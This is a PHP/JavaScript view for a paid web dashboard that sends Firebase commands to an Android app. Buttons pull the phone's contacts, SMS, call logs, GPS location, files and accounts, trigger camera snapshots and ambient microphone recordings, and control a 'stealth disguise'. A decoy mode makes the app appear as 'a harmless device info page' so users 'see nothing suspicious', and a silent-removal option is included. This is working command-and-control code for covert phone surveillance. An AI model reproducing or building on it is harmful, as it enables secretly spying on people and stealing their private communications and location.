<?php /** @var array|null $targetDevice */ ?>
<div class="content-wrapper">
    <!-- Page Header -->
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-2 align-items-center">
                <div class="col-sm-6">
                    <h1><i class="fas fa-mobile-alt text-primary mr-2"></i>Remote Device</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?= base_url('dashboard') ?>">Home</a></li>
                        <li class="breadcrumb-item active">Remote Device</li>
                    </ol>
                </div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">

            <?php if (session()->getFlashdata('error')): ?>
            <div class="alert alert-danger alert-dismissible">
                <button type="button" class="close" data-dismiss="alert">&times;</button>
                <?= session()->getFlashdata('error') ?>
            </div>
            <?php endif; ?>

            <!-- Page Callout -->
            <div class="callout callout-info">
                <h5><i class="fas fa-satellite-dish mr-2"></i>Interactive Control Console</h5>
                <p class="mb-0 text-muted small">
                    Trigger data extraction, device management, and remote synchronization on your registered Android device.
                    Commands are delivered via Firebase Cloud Messaging (FCM) — device must be online to receive them.
                </p>
            </div>

            <!-- Device Status Row -->
            <div class="row mb-3">
                <div class="col-12">
                    <?php if ($targetDevice): ?>
                    <div class="callout callout-success py-2">
                        <div class="d-flex align-items-center flex-wrap">
                            <i class="fas fa-mobile-alt text-success fa-2x mr-3"></i>
                            <div>
                                <strong><?= htmlspecialchars($targetDevice['device_model'] ?? 'Unknown Device') ?></strong>
                                <span class="badge badge-success ml-2">Active</span><br>
                                <small class="text-muted"><?= htmlspecialchars($targetDevice['device_manufacturer'] ?? '') ?> &bull; FCM token on record</small>
                            </div>
                            <?php if (!empty($recentUploadSources)): ?>
                            <div class="ml-auto d-flex align-items-center flex-wrap">
                                <small class="text-muted mr-2"><i class="fas fa-cloud-upload-alt mr-1"></i>Last 7 days:</small>
                                <?php foreach ($recentUploadSources as $src): ?>
                                    <?php $badgeClass = match($src['upload_source']) {
                                        'manual'        => 'badge-primary',
                                        'auto_sync'     => 'badge-secondary',
                                        'web_initiated' => 'badge-success',
                                        default         => 'badge-secondary',
                                    }; ?>
                                    <span class="badge <?= $badgeClass ?> mr-1"><?= str_replace('_', ' ', $src['upload_source']) ?>: <?= $src['count'] ?></span>
                                <?php endforeach; ?>
                            </div>
                            <?php endif; ?>
                        </div>
                    </div>
                    <?php
                        $crypt = new \App\Models\Mod_Crypt();
                        $cryptId = isset($targetDevice['counter']) ? $crypt->encrypt_id($targetDevice['counter']) : '';
                    ?>
                    <script>const activeFcmToken = <?= json_encode($cryptId) ?>;</script>
                    <?php else: ?>
                    <div class="callout callout-warning py-2">
                        <i class="fas fa-exclamation-circle text-warning mr-2"></i>
                        <strong>No Active Device</strong> &mdash; <span class="text-muted small">No registered device with an active FCM token was found for your account.</span>
                    </div>
                    <script>const activeFcmToken = '';</script>
                    <?php endif; ?>
                </div>
            </div>

            <!-- Main Tabbed Card -->
            <div class="card card-primary card-outline">
                <div class="card-header p-0 pt-1 border-bottom-0">
                    <ul class="nav nav-tabs" id="remoteDeviceTabs" role="tablist">
                        <li class="nav-item">
                            <a class="nav-link active" id="tab-fetch-link" data-toggle="tab" href="#tab-fetch" role="tab">
                                <i class="fas fa-database mr-1"></i> Data Fetch
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" id="tab-mgmt-link" data-toggle="tab" href="#tab-mgmt" role="tab">
                                <i class="fas fa-cogs mr-1"></i> Device Management
                            </a>
                        </li>
                    </ul>
                </div>

                <div class="card-body">
                    <div class="tab-content" id="remoteDeviceTabsContent">

                        <!-- ==================== DATA FETCH TAB ==================== -->
                        <div class="tab-pane fade show active" id="tab-fetch" role="tabpanel">
                            <div class="alert alert-light border-left-primary border mb-4">
                                <i class="fas fa-info-circle text-primary mr-2"></i>
                                Click any command below to send an extraction request to your device.
                            </div>
                            <div class="row text-center" id="command-grid">
                                <?php
                                $gate = new \App\Services\PlanGate();
                                $ownerId = isset($targetDevice['owner_id']) ? (int)$targetDevice['owner_id'] : 0;
                                
                                $commands = [
                                    ['id' => 'contacts',      'feat' => 'fcm_fetch_contacts',   'label' => 'Contacts',       'icon' => 'fas fa-address-book',   'color' => '#17a2b8', 'desc' => 'Phonebook contacts'],
                                    ['id' => 'beep',          'feat' => 'fcm_cmd_beep',         'label' => 'Test Beep',      'icon' => 'fas fa-volume-up',      'color' => '#8e44ad', 'desc' => 'Play audible test beep'],
                                    ['id' => 'health_check',  'feat' => 'fcm_cmd_health',       'label' => 'Device Health',  'icon' => 'fas fa-heartbeat',      'color' => '#e53935', 'desc' => 'Instant battery/network check'],
                                    ['id' => 'apps',          'feat' => 'fcm_fetch_apps',       'label' => 'Apps List',      'icon' => 'fas fa-th-large',       'color' => '#6f42c1', 'desc' => 'Installed packages list'],
                                    ['id' => 'calls',         'feat' => 'fcm_fetch_calls',      'label' => 'Calls Logs',     'icon' => 'fas fa-phone-alt',      'color' => '#28a745', 'desc' => 'Call history list'],
                                    ['id' => 'sms',           'feat' => 'fcm_fetch_sms',        'label' => 'SMS Messages',   'icon' => 'fas fa-sms',            'color' => '#007bff', 'desc' => 'Text messages logs'],
                                    ['id' => 'location',      'feat' => 'fcm_fetch_location',   'label' => 'Location & Act', 'icon' => 'fas fa-map-marker-alt', 'color' => '#dc3545', 'desc' => 'GPS & activity logs'],
                                    ['id' => 'telemetry_soft','feat' => 'fcm_fetch_usage',      'label' => 'Usage & Notifs', 'icon' => 'fas fa-chart-pie',      'color' => '#6610f2', 'desc' => 'Screen time & status alerts'],
                                    ['id' => 'capture_photo', 'feat' => 'fcm_cmd_camera',       'label' => 'Camera Capture', 'icon' => 'fas fa-camera',         'color' => '#d81b60', 'desc' => 'Snapshot from camera'],
                                    ['id' => 'record_audio',  'feat' => 'fcm_cmd_audio',        'label' => 'Audio Capture',  'icon' => 'fas fa-microphone',     'color' => '#ff8f00', 'desc' => 'Ambient mic clip record'],
                                    ['id' => 'files',         'feat' => 'fcm_fetch_files',      'label' => 'Device Files',   'icon' => 'fas fa-file-alt',       'color' => '#20c997', 'desc' => 'System filesystem files'],
                                    ['id' => 'software_misc', 'feat' => 'fcm_fetch_soft_misc',  'label' => 'Misc Software',  'icon' => 'fas fa-calendar-alt',   'color' => '#fd7e14', 'desc' => 'Calendar, locale, accounts'],
                                    ['id' => 'hardware_misc', 'feat' => 'fcm_fetch_hard_misc',  'label' => 'Misc Hardware',  'icon' => 'fas fa-microchip',      'color' => '#117a8b', 'desc' => 'Bluetooth, sensors, thermal'],
                                    ['id' => 'all',           'feat' => 'fcm_fetch_all',        'label' => 'Sync All',       'icon' => 'fas fa-sync-alt',       'color' => '#b21f2d', 'desc' => 'Trigger all extractors'],
                                ];
                                foreach ($commands as $cmd):
                                    $isAllowed = $ownerId ? $gate->hasFeature($ownerId, $cmd['feat']) : false;
                                ?>
                                <div class="col-6 col-sm-4 col-md-3 col-lg-2 mb-3">
                                    <?php if ($isAllowed): ?>
                                    <button class="btn btn-block btn-remote-cmd p-3 shadow-sm border h-100 d-flex flex-column align-items-center justify-content-center"
                                            data-cmd="<?= $cmd['id'] ?>"
                                            style="border-radius: 10px; transition: all 0.25s ease; background: #fff; cursor:pointer;">
                                        <div class="cmd-icon-wrapper mb-2" style="color: <?= $cmd['color'] ?>; font-size: 1.9rem; width:52px; height:52px; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.03); border-radius:50%;">
                                            <i class="<?= $cmd['icon'] ?>"></i>
                                        </div>
                                        <span class="font-weight-bold text-dark mb-1" style="font-size:13px;"><?= $cmd['label'] ?></span>
                                        <small class="text-muted d-none d-sm-block" style="font-size:10.5px; line-height:1.3;"><?= $cmd['desc'] ?></small>
                                    </button>
                                    <?php else: ?>
                                    <button class="btn btn-block p-3 shadow-sm border h-100 d-flex flex-column align-items-center justify-content-center"
                                            disabled
                                            onclick="toastr.warning('Upgrade plan to access this telemetry data.');"
                                            style="border-radius: 10px; background: #f8f9fa; opacity: 0.6; cursor: not-allowed;">
                                        <div class="cmd-icon-wrapper mb-2 text-muted" style="font-size: 1.9rem; width:52px; height:52px; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.03); border-radius:50%; position:relative;">
                                            <i class="<?= $cmd['icon'] ?>"></i>
                                            <i class="fas fa-lock" style="position:absolute; bottom:0; right:0; font-size:11px; background:#fff; padding:2px; border-radius:50%; color:#dc3545;"></i>
                                        </div>
                                        <span class="font-weight-bold text-muted mb-1" style="font-size:13px;"><?= $cmd['label'] ?> (Locked)</span>
                                        <small class="text-muted d-none d-sm-block" style="font-size:10.5px; line-height:1.3;"><?= $cmd['desc'] ?></small>
                                    </button>
                                    <?php endif; ?>
                                </div>
                                <?php endforeach; ?>
                            </div>
                        </div>

                        <!-- ==================== DEVICE MANAGEMENT TAB ==================== -->
                        <div class="tab-pane fade" id="tab-mgmt" role="tabpanel">
                            <?php
                                $gate = new \App\Services\PlanGate();
                                $ownerId = isset($targetDevice['owner_id']) ? (int)$targetDevice['owner_id'] : 0;
                                $canReset = $ownerId ? $gate->hasFeature($ownerId, 'fcm_cmd_reset_app') : false;
                                $canDeactivate = $ownerId ? $gate->hasFeature($ownerId, 'fcm_cmd_deactivate') : false;
                                $canLogout = $ownerId ? $gate->hasFeature($ownerId, 'fcm_cmd_logout') : false;
                                $canPreserve = $ownerId ? $gate->hasFeature($ownerId, 'fcm_cmd_uninstall_preserve') : false;
                                $canWipe = $ownerId ? $gate->hasFeature($ownerId, 'fcm_cmd_uninstall_wipe') : false;
                            ?>
                            <div class="alert alert-warning alert-dismissible">
                                <i class="fas fa-exclamation-triangle mr-2"></i>
                                <strong>Caution:</strong> These commands make permanent changes to the Android device. Confirm each action carefully before executing.
                            </div>
                            <div class="row" id="mgmt-grid">

                                <!-- Reset App -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-warning h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-undo fa-3x text-warning"></i></div>
                                            <h5 class="card-title text-warning font-weight-bold">Reset App</h5>
                                            <p class="text-muted small mb-4">Restore default icon, clear stealth disguise, and reset launch codes to factory defaults.</p>
                                            <?php if ($canReset): ?>
                                            <button class="btn btn-warning btn-block font-weight-bold btn-mgmt-cmd" data-cmd="reset_app">
                                                <i class="fas fa-undo mr-1"></i> Reset App
                                            </button>
                                            <?php else: ?>
                                            <button class="btn btn-warning btn-block font-weight-bold disabled" disabled onclick="toastr.warning('Upgrade plan to access this command.');">
                                                <i class="fas fa-lock mr-1"></i> Reset App (Locked)
                                            </button>
                                            <?php endif; ?>
                                        </div>
                                    </div>
                                </div>

                                <!-- Deactivate App -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-secondary h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-eye-slash fa-3x text-secondary"></i></div>
                                            <h5 class="card-title text-secondary font-weight-bold">Deactivate App</h5>
                                            <p class="text-muted small mb-4">Replace the active UI with a static dummy screen. Unauthorized users see nothing suspicious.</p>
                                            <?php if ($canDeactivate): ?>
                                            <button class="btn btn-secondary btn-block font-weight-bold btn-mgmt-cmd" data-cmd="deactivate">
                                                <i class="fas fa-eye-slash mr-1"></i> Deactivate
                                            </button>
                                            <?php else: ?>
                                            <button class="btn btn-secondary btn-block font-weight-bold disabled" disabled onclick="toastr.warning('Upgrade plan to access this command.');">
                                                <i class="fas fa-lock mr-1"></i> Deactivate (Locked)
                                            </button>
                                            <?php endif; ?>
                                        </div>
                                    </div>
                                </div>

                                <!-- Logout User -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-info h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-sign-out-alt fa-3x text-info"></i></div>
                                            <h5 class="card-title text-info font-weight-bold">Logout User</h5>
                                            <p class="text-muted small mb-4">Clears auth token on device and stops background sync. Returns the user to the login screen.</p>
                                            <?php if ($canLogout): ?>
                                            <button class="btn btn-info btn-block font-weight-bold btn-mgmt-cmd" data-cmd="logout">
                                                <i class="fas fa-sign-out-alt mr-1"></i> Logout
                                            </button>
                                            <?php else: ?>
                                            <button class="btn btn-info btn-block font-weight-bold disabled" disabled onclick="toastr.warning('Upgrade plan to access this command.');">
                                                <i class="fas fa-lock mr-1"></i> Logout (Locked)
                                            </button>
                                            <?php endif; ?>
                                        </div>
                                    </div>
                                </div>

                                <!-- Uninstall Keep Data -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-danger h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-archive fa-3x text-danger"></i></div>
                                            <h5 class="card-title text-danger font-weight-bold">Uninstall (Keep Data)</h5>
                                            <p class="text-muted small mb-4">Backs up app data then uninstalls. Reinstalling the app will restore configuration automatically.</p>
                                            <?php if ($canPreserve): ?>
                                            <button class="btn btn-danger btn-block font-weight-bold btn-mgmt-cmd" data-cmd="uninstall_preserve">
                                                <i class="fas fa-archive mr-1"></i> Uninstall &amp; Preserve
                                            </button>
                                            <?php else: ?>
                                            <button class="btn btn-danger btn-block font-weight-bold disabled" disabled onclick="toastr.warning('Upgrade plan to access this command.');">
                                                <i class="fas fa-lock mr-1"></i> Uninstall &amp; Preserve (Locked)
                                            </button>
                                            <?php endif; ?>
                                        </div>
                                    </div>
                                </div>

                                <!-- Uninstall Wipe All -->
                                <div class="col-md-6 col-lg-4 mb-4">
                                    <div class="card card-outline card-dark h-100 shadow-sm">
                                        <div class="card-body text-center p-4">
                                            <div class="mb-3"><i class="fas fa-trash-alt fa-3x text-dark"></i></div>
                                            <h5 class="card-title font-weight-bold">Uninstall (Wipe All)</h5>
                                            <p class="text-muted small mb-4">Completely removes the app and all local data. Device admin may enable silent removal. Cannot be undone.</p>
                                            <?php if ($canWipe): ?>
                                            <button class="btn btn-dark btn-block font-weight-bold btn-mgmt-cmd" data-cmd="uninstall_wipe">
                                                <i class="fas fa-trash-alt mr-1"></i> Uninstall &amp; Wipe
                                            </button>
                                            <?php else: ?>
                                            <button class="btn btn-dark btn-block font-weight-bold disabled" disabled onclick="toastr.warning('Upgrade plan to access this command.');">
                                                <i class="fas fa-lock mr-1"></i> Uninstall &amp; Wipe (Locked)
                                            </button>
                                            <?php endif; ?>
                                        </div>
                                    </div>
                                </div>

                            </div><!-- /.row#mgmt-grid -->
                        </div><!-- /.tab-pane#tab-mgmt -->

                    </div><!-- /.tab-content -->
                </div><!-- /.card-body -->

                <div class="card-footer bg-light">
                    <div class="d-flex align-items-center flex-wrap">
                        <i class="fas fa-info-circle text-muted mr-2"></i>
                        <small class="text-muted">Commands are sent via Google Firebase Cloud Messaging (FCM). The device must be online. Some actions require Device Admin privileges.</small>
                        <span class="badge badge-info ml-auto" id="status-display" style="display:none;">Ready</span>
                    </div>
                </div>

            </div><!-- /.card -->

        </div><!-- /.container-fluid -->
    </section>
</div><!-- /.content-wrapper -->

<!-- Device Health Modal -->
<div class="modal fade" id="modal-health-check" tabindex="-1" role="dialog" aria-labelledby="healthCheckModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered" role="document">
        <div class="modal-content shadow-lg border-0" style="border-radius:15px;">
            <div class="modal-header bg-dark text-white" style="border-top-left-radius:15px; border-top-right-radius:15px;">
                <h5 class="modal-title font-weight-bold" id="healthCheckModalLabel">
                    <i class="fas fa-heartbeat text-danger mr-2"></i> Device Diagnostics
                </h5>
                <button type="button" class="close text-white" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body p-4" id="health-check-body">
                <!-- Loading State -->
                <div class="text-center py-5" id="health-loading">
                    <div class="spinner-border text-danger mb-3" role="status" style="width: 3rem; height: 3rem;">
                        <span class="sr-only">Checking...</span>
                    </div>
                    <h5 class="font-weight-bold text-dark">Contacting Device...</h5>
                    <p class="text-muted small">Sent FCM signal. Waiting for diagnostics callback payload.</p>
                </div>

                <!-- Metrics Display (Hidden initially) -->
                <div id="health-metrics" style="display:none;">
                    <div class="text-center mb-4">
                        <span class="badge badge-success px-3 py-2 font-weight-bold" id="health-net-badge">
                            <i class="fas fa-wifi mr-1"></i> WI-FI Connected
                        </span>
                        <div class="text-muted small mt-1" id="health-ssid-display">SSID: Unknown</div>
                    </div>

                    <div class="row mb-3">
                        <!-- Battery -->
                        <div class="col-6">
                            <div class="card bg-light border-0 p-3 h-100 text-center">
                                <div class="text-warning mb-2" style="font-size:1.8rem;"><i class="fas fa-battery-three-quarters" id="health-batt-icon"></i></div>
                                <h6 class="font-weight-bold text-dark mb-1">Battery</h6>
                                <div class="h5 font-weight-bold text-dark mb-1" id="health-batt-level">--%</div>
                                <small class="text-muted" id="health-batt-status">Discharging (32.4°C)</small>
                            </div>
                        </div>

                        <!-- Screen & Lock -->
                        <div class="col-6">
                            <div class="card bg-light border-0 p-3 h-100 text-center">
                                <div class="text-info mb-2" style="font-size:1.8rem;"><i class="fas fa-mobile-alt" id="health-screen-icon"></i></div>
                                <h6 class="font-weight-bold text-dark mb-1">Screen State</h6>
                                <div class="h5 font-weight-bold text-dark mb-1" id="health-screen-state">Unknown</div>
                                <small class="text-muted" id="health-screen-lock">Keyguard: Locked</small>
                            </div>
                        </div>
                    </div>

                    <div class="row mb-3">
                        <!-- Storage -->
                        <div class="col-6">
                            <div class="card bg-light border-0 p-3 h-100 text-center">
                                <div class="text-primary mb-2" style="font-size:1.8rem;"><i class="fas fa-hdd"></i></div>
                                <h6 class="font-weight-bold text-dark mb-1">Free Storage</h6>
                                <div class="h5 font-weight-bold text-dark mb-1" id="health-storage-free">--%</div>
                                <small class="text-muted" id="health-ram-free">Free RAM: -- MB</small>
                            </div>
                        </div>

                        <!-- Device Network -->
                        <div class="col-6">
                            <div class="card bg-light border-0 p-3 h-100 text-center">
                                <div class="text-success mb-2" style="font-size:1.8rem;"><i class="fas fa-network-wired"></i></div>
                                <h6 class="font-weight-bold text-dark mb-1">IP & Carrier</h6>
                                <div class="h5 font-weight-bold text-dark mb-1" style="font-size:14px; overflow-wrap:anywhere;" id="health-ip">0.0.0.0</div>
                                <small class="text-muted" id="health-carrier">SIM: None</small>
                            </div>
                        </div>
                    </div>

                    <hr>

                    <!-- Location and System -->
                    <div class="d-flex align-items-center mb-2">
                        <i class="fas fa-map-marker-alt text-danger mr-2"></i>
                        <span class="font-weight-bold text-dark small">Location:</span>
                        <span class="ml-auto text-muted small" id="health-location">Unavailable</span>
                    </div>
                    <div class="d-flex align-items-center mb-2">
                        <i class="fas fa-history text-muted mr-2"></i>
                        <span class="font-weight-bold text-dark small">System Uptime:</span>
                        <span class="ml-auto text-muted small" id="health-uptime">-- hours</span>
                    </div>
                    <div class="d-flex align-items-center">
                        <i class="fas fa-code-branch text-muted mr-2"></i>
                        <span class="font-weight-bold text-dark small">App Version:</span>
                        <span class="ml-auto text-muted small" id="health-version">v0.0.0</span>
                    </div>
                </div>

                <!-- Error State -->
                <div class="text-center py-5" id="health-error" style="display:none;">
                    <div class="text-danger mb-3" style="font-size:3rem;"><i class="fas fa-exclamation-triangle"></i></div>
                    <h5 class="font-weight-bold text-dark" id="health-error-title">Check Failed</h5>
                    <p class="text-muted small" id="health-error-desc">Device did not respond to the health request in time.</p>
                </div>
            </div>
            <div class="modal-footer bg-light" style="border-bottom-left-radius:15px; border-bottom-right-radius:15px;">
                <button type="button" class="btn btn-secondary btn-block font-weight-bold" data-dismiss="modal">Close Diagnostics</button>
            </div>
        </div>
    </div>
</div>

<style>
.btn-remote-cmd:hover {
    transform: translateY(-4px);
    box-shadow: 0 8px 20px rgba(0,0,0,0.12) !important;
    border-color: #007bff !important;
}
.btn-remote-cmd:active { transform: translateY(-1px); }
.btn-remote-cmd.loading { opacity: 0.65; pointer-events: none; }
.btn-mgmt-cmd.loading  { opacity: 0.65; pointer-events: none; }
.cmd-icon-wrapper { transition: background 0.25s; }
.btn-remote-cmd:hover .cmd-icon-wrapper { background: rgba(0,123,255,0.07) !important; }
@keyframes spin { 100% { transform: rotate(360deg); } }
.btn-remote-cmd.loading .cmd-icon-wrapper i { animation: spin 0.8s linear infinite; }
</style>

<!-- Toastr -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>

<script>
$(function() {

    // ========================
    // DATA FETCH COMMANDS
    // ========================
    $('.btn-remote-cmd').on('click', function() {
        const $btn = $(this);
        const cmd  = $btn.data('cmd');
        const $iconEl = $btn.find('.cmd-icon-wrapper i');
        const origIconClass = $iconEl.attr('class');

        const executeCommand = (extraData = {}) => {
            if ($btn.hasClass('loading')) return;
            $btn.addClass('loading').prop('disabled', true);
            $iconEl.attr('class', 'fas fa-spinner');
            $('#status-display').fadeIn().removeClass('badge-danger badge-success').addClass('badge-info').text('Sending ' + cmd + '…');

            const resetBtn = () => {
                $btn.removeClass('loading').prop('disabled', false);
                $iconEl.attr('class', origIconClass);
                setTimeout(() => $('#status-display').fadeOut(), 5000);
            };

            $.ajax({
                url: `<?= base_url('api/v1/fcm-commands') ?>/${activeFcmToken}/cmd_${cmd}`,
                method: 'POST',
                data: extraData,
                dataType: 'json',
                timeout: 120000,
                success(response) {
                    resetBtn();
                    if (response && response.success) {
                        toastr.success('Command sent successfully.');
                        $('#status-display').removeClass('badge-info').addClass('badge-success').text('Sent: ' + cmd);
                    } else {
                        toastr.error((response && response.message) ? response.message : 'Failed to send command');
                        $('#status-display').removeClass('badge-info').addClass('badge-danger').text('Error: ' + cmd);
                    }
                },
                error(xhr, status) {
                    resetBtn();
                    let msg = 'Network error. Please try again.';
                    if (status === 'timeout') msg = 'Request timed out — device may be offline.';
                    else if (xhr.responseJSON && xhr.responseJSON.message) msg = xhr.responseJSON.message;
                    toastr.error(msg);
                    $('#status-display').removeClass('badge-info').addClass('badge-danger').text('Failed');
                }
            });
        };

        if (!activeFcmToken) { toastr.error('No active device with FCM token found.'); return; }

        if (cmd === 'health_check') {
            $('#health-loading').show();
            $('#health-metrics').hide();
            $('#health-error').hide();
            $('#modal-health-check').modal('show');

            const triggerTime = Date.now();
            let pollInterval = null;
            let attempts = 0;
            const maxAttempts = 10;

            const pollLatestHealth = () => {
                $.ajax({
                    url: `<?= base_url('api/v1/devices/health-latest') ?>/${activeFcmToken}`,
                    method: 'GET',
                    dataType: 'json',
                    success(r) {
                        attempts++;
                        if (r && r.success && r.data) {
                            const data = r.data;
                            const recordTime = new Date(data.created_at).getTime();

                            if (recordTime > (triggerTime - 5000)) {
                                clearInterval(pollInterval);
                                renderHealthMetrics(data);
                                return;
                            }
                        }

                        if (attempts >= maxAttempts) {
                            clearInterval(pollInterval);
                            showHealthError('No Response', 'The device is currently offline or FCM communication was interrupted.');
                        }
                    },
                    error() {
                        attempts++;
                        if (attempts >= maxAttempts) {
                            clearInterval(pollInterval);
                            showHealthError('Connection Error', 'Failed to communicate with local dashboard services.');
                        }
                    }
                });
            };

            const renderHealthMetrics = (data) => {
                $('#health-loading').hide();
                $('#health-metrics').show();

                let netIcon = '<i class="fas fa-network-wired mr-1"></i>';
                if (data.network_type === 'WIFI') {
                    netIcon = '<i class="fas fa-wifi mr-1"></i>';
                } else if (data.network_type === 'MOBILE') {
                    netIcon = '<i class="fas fa-signal mr-1"></i>';
                } else if (data.network_type === 'NONE') {
                    netIcon = '<i class="fas fa-times-circle mr-1"></i>';
                }

                $('#health-net-badge')
                    .html(netIcon + ' ' + data.network_type)
                    .removeClass('badge-success badge-warning badge-danger')
                    .addClass(data.network_type === 'NONE' ? 'badge-danger' : 'badge-success');

                $('#health-ssid-display').text(data.wifi_ssid ? 'SSID: ' + data.wifi_ssid : 'Carrier: ' + (data.sim_operator || 'None'));

                $('#health-batt-level').text(data.battery_level + '%');
                $('#health-batt-status').text(data.battery_status + (data.battery_temp ? ' (' + data.battery_temp + '°C)' : ''));
                
                let battIcon = 'fa-battery-three-quarters';
                if (data.battery_level > 85) battIcon = 'fa-battery-full';
                else if (data.battery_level > 50) battIcon = 'fa-battery-three-quarters';
                else if (data.battery_level > 20) battIcon = 'fa-battery-quarter';
                else battIcon = 'fa-battery-empty';
                $('#health-batt-icon').attr('class', 'fas ' + battIcon);

                $('#health-screen-state').text('Screen ' + data.screen_state);
                $('#health-screen-lock').text(data.keyguard_locked == 1 ? 'Keyguard Locked' : 'Unlocked');
                $('#health-screen-icon')
                    .attr('class', data.screen_state === 'ON' ? 'fas fa-mobile-alt text-success' : 'fas fa-mobile-alt text-muted');

                $('#health-storage-free').text((data.storage_free_percent || '--') + '%');
                $('#health-ram-free').text(data.ram_free_mb ? 'Free RAM: ' + data.ram_free_mb + ' MB' : 'RAM: Unknown');

                $('#health-ip').text(data.ip_address || '0.0.0.0');
                $('#health-carrier').text('Carrier: ' + (data.sim_operator || 'None') + (data.signal_strength ? ' (' + data.signal_strength + ' dBm)' : ''));

                if (data.last_latitude && data.last_longitude) {
                    const locUrl = `https://www.google.com/maps/search/?api=1&query=${data.last_latitude},${data.last_longitude}`;
                    $('#health-location').html(`<a href="${locUrl}" target="_blank" class="text-primary font-weight-bold"><i class="fas fa-external-link-alt mr-1"></i> View on Google Maps (${data.location_provider || 'GPS'})</a>`);
                } else {
                    $('#health-location').text('GPS Signal Lost');
                }

                const uptimeHours = data.uptime_seconds ? Math.round(data.uptime_seconds / 3600 * 10) / 10 : '--';
                $('#health-uptime').text(uptimeHours + ' hours');
                $('#health-version').text(data.app_version || 'Unknown');
            };

            const showHealthError = (title, desc) => {
                $('#health-loading').hide();
                $('#health-metrics').hide();
                $('#health-error').show();
                $('#health-error-title').text(title);
                $('#health-error-desc').text(desc);
            };

            executeCommand();

            setTimeout(() => {
                pollInterval = setInterval(pollLatestHealth, 2000);
            }, 1000);

            $('#modal-health-check').on('hidden.bs.modal', function () {
                if (pollInterval) clearInterval(pollInterval);
            });
        } else {
            executeCommand();
        }
    });

    // ========================
    // DEVICE MANAGEMENT COMMANDS
    // ========================
    $('.btn-mgmt-cmd').on('click', function() {
        const $btn = $(this);
        const cmd  = $btn.data('cmd');

        if (!activeFcmToken) { toastr.error('No active device with FCM token found.'); return; }

        const titles = {
            reset_app:          'Reset Android App?',
            deactivate:         'Deactivate Android App?',
            logout:             'Force Logout on Device?',
            uninstall_preserve: 'Uninstall (Keep Data)?',
            uninstall_wipe:     'Uninstall & Wipe All Data?',
        };
        const texts = {
            reset_app:          'Restores default icon, disables stealth disguise, resets launch codes to defaults.',
            deactivate:         'Replaces the active UI with a static dummy screen. The app appears as a harmless device info page.',
            logout:             'Clears the auth token on the device. Background sync stops and the user returns to the login screen.',
            uninstall_preserve: 'Backs up all app data before uninstalling. Reinstalling will restore your configuration. Continue?',
            uninstall_wipe:     'Permanently removes the app and ALL local data. This CANNOT be undone. Continue?',
        };
        const icons  = { reset_app:'warning', deactivate:'question', logout:'info', uninstall_preserve:'warning', uninstall_wipe:'error' };
        const colors = { reset_app:'#ffc107', deactivate:'#6c757d', logout:'#17a2b8', uninstall_preserve:'#dc3545', uninstall_wipe:'#343a40' };
        const payloads = { reset_app:'reset', deactivate:'deactivate', logout:'logout', uninstall_preserve:'uninstall_preserve', uninstall_wipe:'uninstall_wipe' };

        Swal.fire({
            title: titles[cmd] || 'Execute Command?',
            text:  texts[cmd]  || 'Are you sure?',
            icon:  icons[cmd]  || 'warning',
            showCancelButton: true,
            confirmButtonColor: colors[cmd] || '#dc3545',
            cancelButtonColor: '#6c757d',
            confirmButtonText: 'Yes, Execute',
            cancelButtonText:  'Cancel'
        }).then(result => {
            if (!result.isConfirmed) return;
            const origHtml = $btn.html();
            $btn.addClass('loading').prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-1"></i> Sending…');
            $.ajax({
                url: `<?= base_url('api/v1/fcm-commands') ?>/${activeFcmToken}/cmd_${cmd}/${payloads[cmd] || cmd}`,
                method: 'POST',
                dataType: 'json',
                timeout: 120000,
                success(r) {
                    $btn.removeClass('loading').prop('disabled', false).html(origHtml);
                    if (r && r.success) {
                        Swal.fire({ icon:'success', title:'Command Sent', text:'The device will process the command shortly.', timer:3000, showConfirmButton:false });
                    } else {
                        toastr.error((r && r.message) ? r.message : 'Failed to send command');
                    }
                },
                error(xhr) {
                    $btn.removeClass('loading').prop('disabled', false).html(origHtml);
                    let msg = 'Network error — device may be offline.';
                    if (xhr.responseJSON && xhr.responseJSON.message) msg = xhr.responseJSON.message;
                    toastr.error(msg);
                }
            });
        });
    });
});
</script>
<?php include __DIR__ . '/_adv_style.php'; ?>
